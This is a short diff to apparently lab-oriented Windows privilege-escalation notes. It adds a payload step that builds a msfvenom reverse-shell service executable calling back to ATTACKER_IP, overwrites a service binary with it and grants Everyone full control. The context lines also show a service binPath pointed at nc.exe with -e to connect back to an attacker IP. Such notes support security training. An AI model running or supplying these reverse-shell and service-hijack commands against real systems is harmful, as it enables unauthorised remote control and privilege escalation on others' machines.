@@ -238,6 +238,15 @@ sc config <service_name> binPath="nc.exe <KALI_IP> <PORT> -e C:\Windows\system32
 net start <daclsvc_service_name>
 ```
 
+Payload:
+
+```
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4445 -f exe-service -o rev-svc.exe
+move C:\Users\thm-unpriv\rev-svc.exe WService.exe
+icacls WService.exe /grant Everyone:F
+
+```
+
 ---
 
 # 9. Scheduled Tasks
